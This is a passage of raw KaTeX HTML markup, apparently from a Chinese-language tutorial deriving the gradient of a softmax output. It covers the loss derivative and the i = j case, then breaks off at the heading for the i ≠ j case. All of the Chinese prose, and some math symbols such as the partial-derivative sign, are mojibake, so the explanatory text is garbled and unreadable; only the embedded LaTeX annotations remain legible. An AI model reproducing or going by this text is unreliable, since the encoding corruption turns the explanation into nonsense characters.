style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>æ ¹æ®ä¹‹å‰çš„æ±‚å¯¼ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow></mfrac><mo>=</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo>âˆ’</mo><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial \hat{y_i}} = \hat{y_i} - y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.2519em;vertical-align:-0.8804em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>è€Œè®¡ç®—<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \hat{y_i}}{\partial o_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4745em;vertical-align:-0.5423em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"/><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord mtight">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span> å°±éœ€è¦åˆ†ä¸¤ç§æƒ…å†µäº†ï¼š</p>
<p><strong>å½“ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i = j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> æ—¶ï¼š</strong></p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><mfrac><mi mathvariant="normal">âˆ‚</mi><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo stretchy="false">(</mo><mfrac><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mrow><munderover><mo>âˆ‘</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msup><mi>e</mi><msub><mi>o</mi><mi>k</mi></msub></msup></mrow></mfrac><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><munderover><mo>âˆ‘</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msup><mi>e</mi><msub><mi>o</mi><mi>k</mi></msub></msup><mo>âˆ’</mo><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup></mrow><mrow><mo stretchy="false">(</mo><munderover><mo>âˆ‘</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msup><mi>e</mi><msub><mi>o</mi><mi>k</mi></msub></msup><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mfrac><mo>=</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">(</mo><mn>1</mn><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{\partial \hat{y_j}}{\partial o_j} = \frac{\partial}{\partial o_j}(\frac{e^{o_j}}{\sum_{k=1}^{m}e^{o_k}}) = \frac{e^{o_j}\sum_{k=1}^{m}e^{o_k} - e^{o_j}e^{o_j}}{(\sum_{k=1}^{m}e^{o_k})^2} = \hat{y_i}(1-\hat{y_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.3654em;vertical-align:-0.994em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3414em;"><span style="top:-2.3057em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.994em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.488em;vertical-align:-0.994em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.494em;"><span style="top:-2.3057em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.6897em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.994em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<p><strong>å½“ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo mathvariant="normal">â‰ </mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i \neq j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="inner"><span class="mord"><span class="mrel">î€ </span></span></span><span class="fix"/></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> æ—¶ï¼š</strong></p>
